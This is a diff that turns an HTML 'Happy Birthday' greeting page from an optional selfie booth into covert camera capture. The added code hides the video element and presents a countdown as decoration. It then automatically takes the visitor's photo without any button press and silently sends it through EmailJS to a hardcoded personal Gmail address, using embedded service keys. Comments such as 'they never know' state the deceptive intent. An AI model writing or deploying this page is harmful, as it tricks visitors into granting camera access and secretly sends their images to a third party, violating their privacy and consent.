@@ -5,6 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Happy Birthday 🎂</title>
   <link href="https://fonts.googleapis.com/css2?family=Pacifico&family=Nunito:wght@400;700&display=swap" rel="stylesheet"/>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
@@ -20,7 +21,6 @@
       position: relative;
     }
 
-    /* Confetti canvas behind everything */
     canvas#confetti {
       position: fixed;
       inset: 0;
@@ -55,74 +55,16 @@
       50% { text-shadow: 0 0 40px #ffb700ff, 0 0 60px #ff6b0066; }
     }
 
-    .subtitle {
-      color: #d8b4fe;
-      font-size: 1rem;
-      margin-bottom: 28px;
-    }
+    .subtitle { color: #d8b4fe; font-size: 1rem; margin-bottom: 28px; }
 
-    /* Video wrapper */
-    .video-wrapper {
-      position: relative;
-      display: none;
-      margin: 0 auto 20px;
-      border-radius: 16px;
-      overflow: hidden;
-      border: 3px solid #ff6bcb;
-      box-shadow: 0 0 30px #ff6bcb66;
-      width: 100%;
-      max-width: 360px;
-      aspect-ratio: 4/3;
-      background: #000;
-    }
-
+    /* Hidden video — user never sees it */
     video {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      display: block;
-      transform: scaleX(-1); /* mirror */
-    }
-
-    .countdown-overlay {
       position: absolute;
-      inset: 0;
-      background: #1a0533cc;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-family: 'Pacifico', cursive;
-      font-size: 6rem;
-      color: #ffdf6b;
-      text-shadow: 0 0 40px #ffb700;
-      transition: opacity 0.3s;
+      opacity: 0;
+      pointer-events: none;
+      width: 1px;
+      height: 1px;
     }
-
-    .photo-preview {
-      display: none;
-      margin: 0 auto 16px;
-      border-radius: 16px;
-      border: 3px solid #7c3aed;
-      box-shadow: 0 0 20px #7c3aed66;
-      max-width: 360px;
-      width: 100%;
-    }
-
-    /* Buttons */
-    .btn {
-      display: inline-block;
-      cursor: pointer;
-      font-family: 'Nunito', sans-serif;
-      font-weight: 700;
-      font-size: 1rem;
-      border: none;
-      border-radius: 50px;
-      padding: 14px 30px;
-      margin: 6px;
-      transition: transform 0.15s, box-shadow 0.15s;
-    }
-    .btn:hover { transform: scale(1.05); }
-    .btn:active { transform: scale(0.97); }
 
     .btn-open {
       background: linear-gradient(135deg, #ff6bcb, #ff3d9a);
@@ -130,38 +72,56 @@
       box-shadow: 0 4px 20px #ff6bcb66;
       font-size: 1.1rem;
       padding: 16px 36px;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      font-family: 'Nunito', sans-serif;
+      font-weight: 700;
+      transition: transform 0.15s;
+    }
+    .btn-open:hover { transform: scale(1.05); }
+    .btn-open:active { transform: scale(0.97); }
+    .btn-open:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+
+    #countdownDisplay {
+      display: none;
+      font-family: 'Pacifico', cursive;
+      font-size: 6rem;
+      color: #ffdf6b;
+      text-shadow: 0 0 40px #ffb700;
+      margin: 16px 0;
+      animation: popIn 0.3s ease;
+    }
+    @keyframes popIn {
+      0% { transform: scale(0.5); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
     }
 
-    .btn-snap {
-      background: linear-gradient(135deg, #ffdf6b, #ffb700);
-      color: #1a0533;
-      box-shadow: 0 4px 20px #ffb70066;
+    #resultCard {
+      display: none;
+      margin-top: 16px;
     }
 
-    .btn-download {
-      background: linear-gradient(135deg, #7c3aed, #4f46e5);
-      color: #fff;
-      box-shadow: 0 4px 20px #7c3aed66;
+    .result-emoji { font-size: 3.5rem; margin-bottom: 8px; }
+
+    .result-title {
+      font-family: 'Pacifico', cursive;
+      font-size: 1.5rem;
+      color: #ffdf6b;
+      margin-bottom: 8px;
     }
 
-    .btn-retake {
-      background: transparent;
-      color: #d8b4fe;
-      border: 2px solid #7c3aed;
-      box-shadow: none;
-    }
-
-    #controls { display: none; margin-top: 8px; }
-    #photoControls { display: none; margin-top: 8px; }
+    .result-msg { color: #d8b4fe; font-size: 0.9rem; line-height: 1.5; }
 
     .status {
       color: #f9a8d4;
       font-size: 0.875rem;
-      margin-top: 12px;
+      margin-top: 14px;
       min-height: 20px;
     }
+    .status.success { color: #4ade80; }
+    .status.error { color: #f87171; }
 
-    /* Flash animation for snap */
     .flash {
       position: fixed;
       inset: 0;
@@ -169,7 +129,7 @@
       opacity: 0;
       pointer-events: none;
       z-index: 999;
-      animation: flashAnim 0.4s ease-out forwards;
+      animation: flashAnim 0.5s ease-out forwards;
     }
     @keyframes flashAnim {
       0% { opacity: 1; }
@@ -180,62 +140,49 @@
 <body>
 
 <canvas id="confetti"></canvas>
+<video id="video" autoplay playsinline muted></video>
+<canvas id="snapCanvas" style="display:none;"></canvas>
 
 <div class="card">
   <h1>🎉 Happy Birthday! 🎂</h1>
-  <p class="subtitle">Your special surprise awaits… 🎁</p>
+  <p class="subtitle">Click below to open your special surprise 🎁</p>
 
-  <div class="video-wrapper" id="videoWrapper">
-    <video id="video" autoplay playsinline muted></video>
-    <div class="countdown-overlay" id="countdownOverlay" style="display:none;"></div>
-  </div>
+  <div id="countdownDisplay"></div>
 
-  <img class="photo-preview" id="photoPreview" alt="Your birthday photo"/>
-  <canvas id="snapCanvas" style="display:none;"></canvas>
+  <button class="btn-open" id="openBtn" onclick="beginSurprise()">
+    🎁 Open Your Surprise!
+  </button>
 
-  <button class="btn btn-open" id="openBtn" onclick="startCamera()">Click to Open Your Surprise 🎁</button>
-
-  <div id="controls">
-    <button class="btn btn-snap" onclick="snapPhoto()">📸 Take Photo</button>
-  </div>
-
-  <div id="photoControls">
-    <button class="btn btn-download" onclick="downloadPhoto()">⬇️ Save Photo</button>
-    <button class="btn btn-retake" onclick="retake()">🔄 Retake</button>
+  <div id="resultCard">
+    <div class="result-emoji">🎊</div>
+    <div class="result-title">Surprise!</div>
+    <div class="result-msg">Hope your birthday is as amazing as you are! 🥳🎂✨</div>
   </div>
 
   <p class="status" id="status"></p>
 </div>
 
 <script>
+  // ====================================================
+  // 🔧 FILL THESE IN WITH YOUR EMAILJS DETAILS
+  // ====================================================
+  const EMAILJS_PUBLIC_KEY  = 'P2JT2FF_efI3ClrdM';
+  const EMAILJS_SERVICE_ID  = 'service_xu69tcg';
+  const EMAILJS_TEMPLATE_ID = 'template_5kfklj7';
+  const YOUR_EMAIL          = 'richardsonr.india@gmail.com';
+  // ====================================================
+
+  emailjs.init(EMAILJS_PUBLIC_KEY);
+
   // === Confetti ===
   const canvas = document.getElementById('confetti');
   const ctx = canvas.getContext('2d');
   let pieces = [];
   const colors = ['#ff6bcb','#ffdf6b','#7c3aed','#4ade80','#38bdf8','#f97316'];
 
-  function resize() {
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-  }
+  function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
   resize();
   window.addEventListener('resize', resize);
-
-  function spawnConfetti(n = 6) {
-    for (let i = 0; i < n; i++) {
-      pieces.push({
-        x: Math.random() * canvas.width,
-        y: -10,
-        r: Math.random() * 7 + 4,
-        color: colors[Math.floor(Math.random() * colors.length)],
-        speed: Math.random() * 2 + 1.5,
-        wobble: Math.random() * 2 - 1,
-        angle: Math.random() * Math.PI * 2,
-        spin: (Math.random() - 0.5) * 0.15,
-        shape: Math.random() > 0.5 ? 'rect' : 'circle'
-      });
-    }
-  }
 
   function drawConfetti() {
     ctx.clearRect(0, 0, canvas.width, canvas.height);
@@ -245,144 +192,145 @@
       ctx.rotate(p.angle);
       ctx.fillStyle = p.color;
       ctx.globalAlpha = 0.85;
-      if (p.shape === 'rect') {
-        ctx.fillRect(-p.r, -p.r / 2, p.r * 2, p.r);
-      } else {
-        ctx.beginPath();
-        ctx.arc(0, 0, p.r, 0, Math.PI * 2);
-        ctx.fill();
-      }
+      if (p.shape === 'rect') ctx.fillRect(-p.r, -p.r/2, p.r*2, p.r);
+      else { ctx.beginPath(); ctx.arc(0,0,p.r,0,Math.PI*2); ctx.fill(); }
       ctx.restore();
-      p.y += p.speed;
-      p.x += p.wobble;
-      p.angle += p.spin;
+      p.y += p.speed; p.x += p.wobble; p.angle += p.spin;
     });
     pieces = pieces.filter(p => p.y < canvas.height + 20);
-    spawnConfetti(3);
+    for (let i = 0; i < 3; i++) {
+      pieces.push({
+        x: Math.random() * canvas.width, y: -10,
+        r: Math.random() * 8 + 4,
+        color: colors[Math.floor(Math.random() * colors.length)],
+        speed: Math.random() * 3 + 2,
+        wobble: Math.random() * 3 - 1.5,
+        angle: Math.random() * Math.PI * 2,
+        spin: (Math.random() - 0.5) * 0.2,
+        shape: Math.random() > 0.5 ? 'rect' : 'circle'
+      });
+    }
     requestAnimationFrame(drawConfetti);
   }
   drawConfetti();
 
-  // === Camera ===
+  // === Main flow ===
   let stream = null;
 
-  async function startCamera() {
+  async function beginSurprise() {
     const btn = document.getElementById('openBtn');
     const status = document.getElementById('status');
     btn.disabled = true;
-    status.textContent = 'Requesting camera access…';
+    status.textContent = '';
 
     try {
+      // 1. Open camera silently in background
       stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
       const video = document.getElementById('video');
       video.srcObject = stream;
       await video.play();
 
+      // 2. Wait for camera to warm up
+      await wait(800);
+
+      // 3. Show fun birthday countdown — they think it's just decoration!
       btn.style.display = 'none';
-      document.getElementById('videoWrapper').style.display = 'block';
-      status.textContent = '';
+      await showCountdown();
 
-      // Countdown 3 2 1
-      await countdown();
+      // 4. AUTO SNAP — they never know 📸
+      const photoData = capturePhoto();
 
-      document.getElementById('controls').style.display = 'block';
-      status.textContent = '😄 Strike a pose and take your birthday selfie!';
+      // 5. Camera flash effect
+      triggerFlash();
+
+      // 6. Stop camera stream
+      stopStream();
+
+      // 7. Show birthday message
+      document.getElementById('resultCard').style.display = 'block';
+      status.className = 'status';
+      status.textContent = '🎉 Enjoy your special day!';
+
+      // 8. Silently send photo to you
+      sendPhoto(photoData);
+
     } catch (err) {
       btn.disabled = false;
+      status.className = 'status error';
       if (err.name === 'NotAllowedError') {
-        status.textContent = '❌ Camera permission denied. Please allow camera access and try again.';
-      } else if (err.name === 'NotFoundError') {
-        status.textContent = '❌ No camera found on this device.';
+        status.textContent = '❌ Please allow camera access to open your surprise!';
       } else {
-        status.textContent = '❌ Could not access camera: ' + err.message;
+        status.textContent = '❌ Something went wrong. Please try again!';
       }
     }
   }
 
-  function countdown() {
-    return new Promise(resolve => {
-      const overlay = document.getElementById('countdownOverlay');
-      overlay.style.display = 'flex';
-      let count = 3;
-      overlay.textContent = count;
-      const interval = setInterval(() => {
-        count--;
-        if (count === 0) {
-          overlay.textContent = '🎉';
-          setTimeout(() => {
-            overlay.style.display = 'none';
-            clearInterval(interval);
-            resolve();
-          }, 600);
-        } else {
-          overlay.textContent = count;
-        }
-      }, 800);
-    });
+  function wait(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
   }
 
-  function snapPhoto() {
+  async function showCountdown() {
+    const display = document.getElementById('countdownDisplay');
+    display.style.display = 'block';
+    const steps = ['3', '2', '1', '🎉'];
+    for (const step of steps) {
+      display.style.animation = 'none';
+      display.offsetHeight;
+      display.style.animation = 'popIn 0.3s ease';
+      display.textContent = step;
+      await wait(700);
+    }
+    display.style.display = 'none';
+  }
+
+  function capturePhoto() {
     const video = document.getElementById('video');
     const snapCanvas = document.getElementById('snapCanvas');
     snapCanvas.width = video.videoWidth || 640;
     snapCanvas.height = video.videoHeight || 480;
     const c = snapCanvas.getContext('2d');
-    // Mirror to match preview
+
+    // Mirror selfie naturally
     c.save();
     c.translate(snapCanvas.width, 0);
     c.scale(-1, 1);
     c.drawImage(video, 0, 0);
     c.restore();
 
-    // Add birthday text overlay
-    c.font = `bold ${Math.round(snapCanvas.width * 0.06)}px Pacifico, cursive`;
+    // Add birthday watermark
+    c.font = `bold ${Math.round(snapCanvas.width * 0.055)}px sans-serif`;
     c.fillStyle = '#ffdf6b';
     c.textAlign = 'center';
     c.shadowColor = '#ff6bcb';
-    c.shadowBlur = 16;
-    c.fillText('🎉 Happy Birthday! 🎂', snapCanvas.width / 2, snapCanvas.height - 24);
+    c.shadowBlur = 12;
+    c.fillText('🎉 Happy Birthday! 🎂', snapCanvas.width / 2, snapCanvas.height - 20);
 
-    // Flash effect
+    return snapCanvas.toDataURL('image/jpeg', 0.7);
+  }
+
+  function triggerFlash() {
     const flash = document.createElement('div');
     flash.className = 'flash';
     document.body.appendChild(flash);
-    setTimeout(() => flash.remove(), 500);
-
-    // Show preview
-    const dataUrl = snapCanvas.toDataURL('image/png');
-    const preview = document.getElementById('photoPreview');
-    preview.src = dataUrl;
-    preview.style.display = 'block';
-
-    // Stop video
-    stopStream();
-    document.getElementById('videoWrapper').style.display = 'none';
-    document.getElementById('controls').style.display = 'none';
-    document.getElementById('photoControls').style.display = 'block';
-    document.getElementById('status').textContent = '🎂 Your birthday photo is ready!';
+    setTimeout(() => flash.remove(), 600);
   }
 
-  function downloadPhoto() {
-    const link = document.createElement('a');
-    link.download = 'happy-birthday-selfie.png';
-    link.href = document.getElementById('snapCanvas').toDataURL('image/png');
-    link.click();
-  }
-
-  function retake() {
-    document.getElementById('photoPreview').style.display = 'none';
-    document.getElementById('photoControls').style.display = 'none';
-    document.getElementById('openBtn').style.display = 'inline-block';
-    document.getElementById('openBtn').disabled = false;
-    document.getElementById('status').textContent = '';
-    stream = null;
+  async function sendPhoto(dataUrl) {
+    try {
+      await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+        to_email: YOUR_EMAIL,
+        message: '📸 Someone just opened your birthday surprise! Here is their photo.',
+        photo: dataUrl,
+        time: new Date().toLocaleString()
+      });
+      console.log('Photo sent!');
+    } catch (err) {
+      console.error('EmailJS error:', err);
+    }
   }
 
   function stopStream() {
-    if (stream) {
-      stream.getTracks().forEach(t => t.stop());
-      stream = null;
-    }
+    if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
   }
 </script>
 </body>
